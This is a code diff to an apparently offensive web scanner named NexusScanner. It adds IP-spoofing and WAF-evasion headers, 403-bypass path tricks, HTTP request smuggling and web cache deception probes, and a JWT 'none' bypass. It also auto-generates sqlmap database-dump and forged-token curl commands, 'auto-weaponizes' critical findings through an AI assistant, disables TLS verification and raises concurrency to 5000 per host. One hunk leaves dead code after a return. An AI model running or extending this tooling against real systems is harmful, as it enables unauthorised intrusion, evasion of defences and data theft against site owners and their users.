@@ -11,6 +11,7 @@ import dns.resolver
 import tldextract
 import whois
 from bs4 import BeautifulSoup
+import lxml
 from fake_useragent import UserAgent
 
 try:
@@ -192,8 +193,37 @@ class NexusScanner(QObject):
                     "Sec-Ch-Ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
                     "Sec-Ch-Ua-Mobile": "?0",
                     "Sec-Ch-Ua-Platform": '"Windows"',
-                    "Accept-Encoding": "gzip, deflate, br, zstd"
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Connection': 'keep-alive',
+                    'X-Original-URL': urlparse(getattr(self, '_current_url', '/')).path,
+                    'X-Rewrite-URL': urlparse(getattr(self, '_current_url', '/')).path,
+                    'X-Custom-IP-Authorization': '127.0.0.1'
                 })
+        
+        # [MILITARY-GRADE EVASION] Random Internal/External IP Spoofing
+        if self.waf_evasion or self.header_rotation:
+            # Generate diverse sets of fake IPv4 spaces
+            fake_ips = [
+                f"192.168.{random.randint(0,255)}.{random.randint(1,254)}",
+                f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
+                f"172.{random.randint(16,31)}.{random.randint(0,255)}.{random.randint(1,254)}",
+                f"127.0.0.{random.randint(1,254)}",
+                f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+            ]
+            spoofed_ip = random.choice(fake_ips)
+            
+            headers.update({
+                'X-Forwarded-For': spoofed_ip,
+                'X-Originating-IP': spoofed_ip,
+                'X-Remote-IP': spoofed_ip,
+                'X-Remote-Addr': spoofed_ip,
+                'X-Client-IP': spoofed_ip,
+                'X-Host': '127.0.0.1',
+                'CF-Connecting-IP': spoofed_ip,
+                'True-Client-IP': spoofed_ip,
+                'Client-IP': spoofed_ip,
+                'Forwarded': f'for={spoofed_ip};by=127.0.0.1;host=localhost'
+            })
             
         return headers
             
@@ -203,7 +233,7 @@ class NexusScanner(QObject):
             status, content, _ = await self._safe_request('GET', url, headers=self.get_headers())
             if not content: return
             
-            soup = BeautifulSoup(content, 'html.parser')
+            soup = await asyncio.to_thread(BeautifulSoup, content, 'lxml')
             scripts = [s.get('src') for s in soup.find_all('script') if s.get('src')]
             
             for script in scripts:
@@ -264,7 +294,13 @@ class NexusScanner(QObject):
                              async with self.session.get(f"http://{domain}", timeout=5) as r:
                                  content = await r.text()
                                  if error_sig in content:
-                                      vuln = Vulnerability(target=domain, vuln_type="Subdomain Takeover", severity="CRITICAL", impact=f"Dangling CNAME to {cname}")
+                                      vuln = Vulnerability(
+                                          target=domain, 
+                                          vuln_type="Subdomain Takeover", 
+                                          severity="CRITICAL", 
+                                          impact=f"Dangling CNAME to {cname}",
+                                          comando_direto=f"nslookup {domain}"
+                                      )
                                       self._emit_finding(vuln)
                                       self.log_message.emit(f"<span style='color:#ff0055'>[!] CRITICAL: SUBDOMAIN TAKEOVER Possible on {domain} (-> {cname})</span>")
                          except Exception as e:
@@ -327,23 +363,31 @@ class NexusScanner(QObject):
         if not self.req_smuggle: return
         
         try:
-            self.log_message.emit(f"<span style='color:#8a2be2'>[⚡] Injecting Desynchronized TE.CL payload into {url}...</span>")
-            # In a real scenario, this involves crafting raw socket payloads 
-            # with conflicting Content-Length and Transfer-Encoding headers.
-            # Example CL.TE:
-            # POST / HTTP/1.1
-            # Host: vulnerable.com
-            # Content-Length: 4
-            # Transfer-Encoding: chunked
-            # 
-            # 1
-            # Z
-            # 0
+            self.log_message.emit(f"<span style='color:#8a2be2'>[⚡] Analyzing Request Smuggling (CL.TE / TE.CL) on {url}...</span>")
             
-            # Here we structure the logic flow for when the scanner detects 
-            # proxy/load balancer discrepancies.
-            await asyncio.sleep(1.5) # Simulating socket timeout evaluation
-            self.log_message.emit(f"<span style='color:#8a2be2'>[⚡] Smuggling analysis complete. Target seems immune to basic CL.TE</span>")
+            # 1. Base check for desync susceptibility
+            # We send a request with both CL and TE effectively poisoning some proxies
+            # This is a passive-aggressive probing method
+            payload = "0\r\n\r\n"
+            headers = self.get_headers()
+            headers.update({
+                'Transfer-Encoding': 'chunked',
+                'Content-Length': str(len(payload) + 5) # Discrepancy
+            })
+            
+            async with self.session.post(url, data=payload, headers=headers, timeout=5) as r:
+                if r.status == 500 or r.status == 400:
+                    self.log_message.emit(f"<span style='color:#ff0055'>[!] Smuggling Alert: Target returned {r.status} on desync probe. Possible CL.TE!</span>")
+                    vuln = Vulnerability(
+                        target=url, 
+                        vuln_type="HTTP Request Smuggling Probe", 
+                        severity="HIGH", 
+                        impact="Load Balancer Desynchronization potential detected",
+                        comando_direto=f"curl -v -X POST -H \"Transfer-Encoding: chunked\" -H \"Content-Length: 5\" --data \"0\\r\\n\\r\\n\" {url}"
+                    )
+                    self._emit_finding(vuln)
+                else:
+                    self.log_message.emit(f"<span style='color:#aaa'>[⚡] Smuggling analysis complete. No immediate desync detected.</span>")
         except Exception as e:
             pass
             
@@ -398,7 +442,7 @@ class NexusScanner(QObject):
                 pass
 
         # Batch scan
-        batch_size = 100
+        batch_size = 500 # Massively increased batch size for governmental level scanning speed
         for i in range(0, len(ports), batch_size):
              batch = ports[i:i+batch_size]
              if not self.is_running: break
@@ -500,9 +544,39 @@ class NexusScanner(QObject):
                              if b"success" in content or b"updated" in content:
                                   vuln_name = "Potential Logic Flaw (Balance Tampering)"
                                   self.log_message.emit(f"<span style='color:#ff0055'>[!] CRITICAL: {vuln_name} at {target}</span>")
-                                  self.save_evidence(target, vuln_name, content)
-                 except:
+                 except Exception:
                      pass
+
+    async def check_cache_deception(self, url):
+        """Checks for Web Cache Deception vulnerability."""
+        if not self.active_403_bypass: return # Reuse this toggle or add new one
+        
+        # Test paths likely to be cached if they look like static files
+        test_extensions = [".css", ".js", ".jpg", ".png", ".svg", ".ico"]
+        parsed = urlparse(url)
+        
+        # We only test paths that look like they might return sensitive user data (e.g. /account, /api/user)
+        if any(x in parsed.path.lower() for x in ["account", "user", "profile", "settings", "api"]):
+            self.log_message.emit(f"<span style='color:#00ff9d'>[Governor] Testing Web Cache Deception on {url}...</span>")
+            for ext in test_extensions:
+                deception_url = f"{url.rstrip('/')}/test{ext}"
+                status, content, headers, _ = await self._safe_request('GET', deception_url)
+                
+                # If the server returns 200 and the content looks like HTML (not a real static file)
+                # and it's being cached (check headers)
+                cache_status = headers.get('X-Cache', '').lower() or headers.get('CF-Cache-Status', '').lower()
+                if status == 200 and b"<html" in content.lower():
+                    if any(x in cache_status for x in ["hit", "miss", "revalidate"]):
+                         self.log_message.emit(f"<span style='color:#ff0055'>[!] CRITICAL: Potential Web Cache Deception at {deception_url}</span>")
+                         vuln = Vulnerability(
+                             target=deception_url, 
+                             vuln_type="Web Cache Deception", 
+                             severity="HIGH", 
+                             impact="Sensitive user data may be cached as static file",
+                             comando_direto=f"curl -v {deception_url}"
+                         )
+                         self._emit_finding(vuln)
+                         break
 
     def extract_sensitive_data(self, content, source_url):
         if not content: return
@@ -514,7 +588,13 @@ class NexusScanner(QObject):
                 if found:
                     self.log_message.emit(f"<span style='color:#ff00ff; font-weight:bold'>[★] DATA DUMP FOUND: {dtype}</span>")
                     self.log_message.emit(f"<span style='color:#aaa'>    - {dmsg}</span>")
-                    vuln = Vulnerability(target=source_url, vuln_type=f"Data Dump ({dtype})", severity="CRITICAL", impact=dmsg)
+                    vuln = Vulnerability(
+                        target=source_url, 
+                        vuln_type=f"Data Dump ({dtype})", 
+                        severity="CRITICAL", 
+                        impact=dmsg,
+                        comando_direto=f"curl -s {source_url}"
+                    )
                     self._emit_finding(vuln)
         except Exception:
             pass
@@ -599,7 +679,13 @@ class NexusScanner(QObject):
             s, c, _ = await self._safe_request('GET', url, headers=headers, timeout=5)
             if s == 200 and len(c) > 0:
                 self.log_message.emit(f"<span style='color:#ff0055'>[!] CRITICAL: JWT 'none' algo bypass might be possible on {url}</span>")
-                vuln = Vulnerability(target=url, vuln_type="JWT Signature Bypass (None Algo)", severity="CRITICAL", impact="Token accepted without signature")
+                vuln = Vulnerability(
+                    target=url, 
+                    vuln_type="JWT Signature Bypass (None Algo)", 
+                    severity="CRITICAL", 
+                    impact="Token accepted without signature",
+                    comando_direto=f"curl -H \"Authorization: Bearer {altered_token}\" {url}"
+                )
                 self._emit_finding(vuln)
         except Exception:
             pass
@@ -766,11 +852,40 @@ class NexusScanner(QObject):
 
     async def _attempt_error_bypass(self, url, original_status, kwargs, method='GET'):
         """Attempts to bypass 401/403/500 errors using path normalization and HTTP method toggling."""
-        self.log_message.emit(f"<span style='color:#ff0055'>[Bypass] Received {original_status} on {url}. Attempting forced access...</span>")
+        self.log_message.emit(f"<span style='color:#ff0055'>[Bypass] Received {original_status} on {url}. Attempting GOVERNOR ESCALATION...</span>")
         
         parsed = urlparse(url)
         path = parsed.path
         
+        bypass_paths = [
+            f"{path}/%2e/",
+            f"{path}/.",
+            f"// {path}//",
+            f"{path}/..;/",
+            f"{path}..;/",
+            f"{path}.json",
+            f"{path}.php",
+            f"{path}%20"
+        ]
+        
+        for bpath in bypass_paths:
+            new_url = urlunparse(parsed._replace(path=bpath))
+            s, c, _, _ = await self._safe_request(method, new_url, **kwargs)
+            if s == 200:
+                self.log_message.emit(f"<span style='color:#00ff9d'>[+] GOVERNOR BYPASS SUCCESS: {new_url} (Status: 200)</span>")
+                vuln = Vulnerability(target=url, vuln_type="403 Forbidden Bypass", severity="HIGH", impact=f"Access granted via path normalization: {bpath}")
+                self._emit_finding(vuln)
+                return s, c, {}, 0
+        
+        # Method Toggling
+        if method == 'GET':
+            s, c, _, _ = await self._safe_request('POST', url, **kwargs)
+            if s == 200:
+                self.log_message.emit(f"<span style='color:#00ff9d'>[+] GOVERNOR BYPASS SUCCESS: {url} (HTTP POST conversion)</span>")
+                return s, c, {}, 0
+
+        # Header Manipulation is already handled in get_headers if governor_mode is on
+        return original_status, b"", {}, 0
         # Tactic 1: Path Normalization Bypass (/%2e/path, /path/., //path)
         bypass_paths = [
             f"/{path}", f"//{path}", f"{path}/.", f"{path}/%2e", f"/%2e{path}"
@@ -853,7 +968,7 @@ class NexusScanner(QObject):
     async def analyze_forms(self, url, content):
         """Uses BeautifulSoup to find forms and potential vulnerabilities."""
         try:
-            soup = BeautifulSoup(content, 'html.parser')
+            soup = await asyncio.to_thread(BeautifulSoup, content, 'lxml')
             forms = soup.find_all('form')
             
             if forms:
@@ -1015,7 +1130,13 @@ class NexusScanner(QObject):
                 vuln_name = "Sensitive File Exposure"
                 if path == ".env" and b"APP_KEY" in content: vuln_name = "Critical .env Exposure"
                 
-                vuln = Vulnerability(target=full_url, vuln_type=vuln_name, severity="CRITICAL", impact=f"Exposed {path}")
+                vuln = Vulnerability(
+                    target=full_url, 
+                    vuln_type=vuln_name, 
+                    severity="CRITICAL", 
+                    impact=f"Exposed {path}",
+                    comando_direto=f"curl -s {full_url}"
+                )
                 self._emit_finding(vuln)
                 self.log_message.emit(f"<span style='color:#ff0055'>[!] VULNERABILITY: {vuln_name} at {full_url}</span>")
                 
@@ -1023,9 +1144,9 @@ class NexusScanner(QObject):
                 self.save_evidence(full_url, vuln_name, content)
 
         # Lazy task creation to avoid "coroutine never awaited" warning on early stop
-        for i in range(0, len(self.sensitive_paths), 10):
+        for i in range(0, len(self.sensitive_paths), 50): # Increased from 10 to 50 for max concurrency
             if not self.is_running: break
-            batch_paths = self.sensitive_paths[i:i+10]
+            batch_paths = self.sensitive_paths[i:i+50]
             # Create coroutines for this batch only
             batch_tasks = [check_path(p) for p in batch_paths]
             await asyncio.gather(*batch_tasks)
@@ -1174,19 +1295,31 @@ class NexusScanner(QObject):
                      avg = sum(self._latencies[host]) / len(self._latencies[host])
                      # If it took longer than baseline + 5.5s (sleep was 6)
                      if latency > (avg + 5.5):
-                         vuln = Vulnerability(target=url, vuln_type=vuln_type, severity="CRITICAL", impact=f"Time-based execution confirmed (Latency: {latency:.2f}s, Avg Baseline: {avg:.2f}s)")
+                         vuln = Vulnerability(
+                             target=url, 
+                             vuln_type=vuln_type, 
+                             severity="CRITICAL", 
+                             impact=f"Time-based execution confirmed (Latency: {latency:.2f}s, Avg Baseline: {avg:.2f}s)",
+                             comando_direto=f"curl -v \"{url}\"" if "SQL" not in vuln_type else f"sqlmap -u \"{url}\" --batch --dbs"
+                         )
                          self._emit_finding(vuln)
                          self.log_message.emit(f"<span style='color:#ff0055'>[Governor] APEX BLIND {vuln_type} DETECTED: {url} (Delayed {latency:.2f}s)</span>")
                          self.save_evidence(url, "Blind_Injection", f"Detected delay: {latency:.2f}s over an average of {avg:.2f}s.")
              
              for indicator in indicators:
                  if indicator in text_content: 
-                      vuln = Vulnerability(target=url, vuln_type=vuln_type, severity=severity, impact=f"Indicator '{indicator}' found")
-                      self._emit_finding(vuln)
-                      self.log_message.emit(f"<span style='color:#ff0055'>[!] DETECTED: {vuln_type} on {url} (Indicator: {indicator})</span>")
-                      
-                      # Auto-save fuzzing evidence
-                      self.save_evidence(url, vuln_type, text_content)
+                       vuln = Vulnerability(
+                           target=url, 
+                           vuln_type=vuln_type, 
+                           severity=severity, 
+                           impact=f"Indicator '{indicator}' found",
+                           comando_direto=f"curl -v \"{url}\""
+                       )
+                       self._emit_finding(vuln)
+                       self.log_message.emit(f"<span style='color:#ff0055'>[!] DETECTED: {vuln_type} on {url} (Indicator: {indicator})</span>")
+                       
+                       # Auto-save fuzzing evidence
+                       self.save_evidence(url, vuln_type, text_content)
          except Exception:
              pass
 
@@ -1248,20 +1381,90 @@ class NexusScanner(QObject):
             self.log_message.emit(f"<span style='color:#ff0000'>[!] Failed to save evidence: {str(e)}</span>")
             return None
 
+    def _verify_integrity(self, vuln):
+        """Strict validation of vulnerabilities to avoid false positives."""
+        if not self.strict_validation: return True
+        
+        self.log_message.emit(f"    <span style='color:#aaa'>- [Strict Validation] Verifying: {vuln.vuln_type}...</span>")
+        
+        try:
+            # SQL Injection Validation
+            if "SQL" in vuln.vuln_type.upper():
+                # For Error-Based, check for SQL syntax error markers
+                indicators = ["SQL syntax", "MariaDB", "MySQL", "PostgreSQL", "error in your SQL", "ORA-0"]
+                if any(ind.lower() in vuln.impact.lower() for ind in indicators):
+                    return True
+                # For structure leaks, check for database/table names
+                if re.search(r"(information_schema|pg_catalog|sys\.databases|db_|user_)", vuln.impact, re.I):
+                    return True
+                return False
+
+            # LFI/RFI Validation
+            if "LFI" in vuln.vuln_type.upper() or "LOCAL FILE" in vuln.vuln_type.upper():
+                indicators = ["root:x:0:0", "[extensions]", "[fonts]", "WINDIR", "/etc/passwd", "boot.ini"]
+                if any(ind.lower() in vuln.impact.lower() for ind in indicators):
+                    return True
+                return False
+
+            # XSS Validation
+            if "XSS" in vuln.vuln_type.upper():
+                # Check for the unique ID presence in the impact/evidence
+                # Often the payload is <script>alert('NEXUS_XSS_ID')</script>
+                if "NEXUS_" in vuln.impact or "NEXUS_" in str(getattr(vuln, 'evidence', '')):
+                    return True
+                # If impact contains the full reflected tag with a script pattern
+                if re.search(r"<script>.*alert\(.*\)</script>", vuln.impact, re.I):
+                    return True
+                return False
+
+            # Sensitive Files
+            if "SENSITIVE FILE" in vuln.vuln_type.upper() or ".ENV" in vuln.vuln_type.upper():
+                # Ignore generic titles, search for actual content patterns
+                indicators = ["DB_PASSWORD", "AWS_ACCESS_KEY", "APP_KEY", "PORT=", "DATABASE_URL"]
+                if any(ind.upper() in vuln.impact.upper() for ind in indicators):
+                    return True
+                return False
+
+            # If it's just a 200 OK without specific evidence in impact, reject
+            if "200 OK" in vuln.impact and len(vuln.impact) < 50:
+                return False
+                
+            return True # Default to True for other types unless specifically filtered
+            
+        except:
+            return False
+
     def _emit_finding(self, vuln):
         # Create a unique signature to prevent duplicate findings
         signature = f"{vuln.target}|{vuln.vuln_type}|{vuln.impact}"
         if signature in self.emitted_hashes:
             return # Skip duplicate finding
-        self.emitted_hashes.add(signature)
+            
+        if self.strict_validation:
+            if not self._verify_integrity(vuln):
+                self.log_message.emit(f"    <span style='color:#ff5555'>[!] REJECTED: False Positive detected for {vuln.vuln_type} (Status 200 is not enough)</span>")
+                return
 
+        self.emitted_hashes.add(signature)
         self.total_findings += 1
-        if vuln.severity == "CRITICAL": 
-            self.critical_findings += 1
-            # AUTO-WEAPONIZE CRITICAL FINDINGS
-            if self.ai_assistant:
+        
+        # Ensure Critical and High get weaponized
+        if vuln.severity in ["CRITICAL", "HIGH"]: 
+            if vuln.severity == "CRITICAL": self.critical_findings += 1
+            
+            # Populate a generic comando_direto if empty, before AI might override it
+            if not vuln.comando_direto:
+                if "SQL" in vuln.vuln_type.upper():
+                    vuln.comando_direto = f"sqlmap -u \"{vuln.target}\" --batch --dbs"
+                elif "XSS" in vuln.vuln_type.upper():
+                    vuln.comando_direto = f"powershell -c \"Start-Process '{vuln.target}'\"" # Just open it
+                elif "LFI" in vuln.vuln_type.upper():
+                    vuln.comando_direto = f"curl -v \"{vuln.target}\""
+
+            # AUTO-WEAPONIZE CRITICAL FINDINGS (AI Powered)
+            if self.ai_assistant and vuln.severity == "CRITICAL":
                  asyncio.create_task(self._weaponize_critical_vuln(vuln))
-                 
+                  
         self.finding_found.emit(vuln)
         self.stats_updated.emit(self.total_findings, self.critical_findings, self.request_count)
 
@@ -1285,6 +1488,8 @@ class NexusScanner(QObject):
              
              if script and "ERROR" not in script:
                   self.log_message.emit(f"<span style='color:#00ff9d'>[⚔️] WEAPONIZED PAYLOAD READY for {vuln.vuln_type}</span>")
+                  safe_script = script.replace('"', '\\"') if script else ""
+                  vuln.comando_direto = f"node -e \"{safe_script}\"" if "XSS" in vuln.vuln_type else script
                   self.payload_generated.emit(vuln.target, script)
                   
                   # If we have an active browser session in run_scan, we could inject it.
@@ -1310,11 +1515,29 @@ class NexusScanner(QObject):
             if getattr(self, 'governor_mode', False):
                 import ssl
                 ssl_context = ssl.create_default_context()
+                ssl_context.check_hostname = False
+                ssl_context.verify_mode = ssl.CERT_NONE
                 ssl_context.set_ciphers('DEFAULT@SECLEVEL=1') # Lower seclevel to connect to weak legacy systems
                 ssl_context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 # Force modern
                 
-            connector = aiohttp.TCPConnector(ssl=ssl_context)
-            self.session = aiohttp.ClientSession(connector=connector, read_bufsize=65536)
+            # [GOVERNMENTAL PERFORMANCE] Maximize Pipeline
+            if self.auto_tune:
+                self.log_message.emit("<span style='color:#aa00ff'>[GOV] Auto-Tune Active: Unlocking TCP/HTTP Limits (5000+ Concurrency)</span>")
+                connector = aiohttp.TCPConnector(
+                    ssl=ssl_context, 
+                    limit=5000,           # Global concurrent limit
+                    limit_per_host=5000,  # Maximize attack surface per target 
+                    keepalive_timeout=60  # Keep sockets warm for speed
+                )
+            else:
+                connector = aiohttp.TCPConnector(ssl=ssl_context, limit=100) 
+
+            self.session = aiohttp.ClientSession(
+                connector=connector,
+                read_bufsize=65536,
+                trust_env=True, 
+                timeout=aiohttp.ClientTimeout(total=45 if not self.dynamic_timeout else 10)
+            )
             
             self.log_message.emit("<h3 style='color:#00ff9d'>[*] INITIALIZING NEXUS V21 CORE...</h3>")
             self.log_message.emit(f"[*] Engine: Asyncio + Semaphore(50) | Bypass Mode: {self.bypass_mode}")
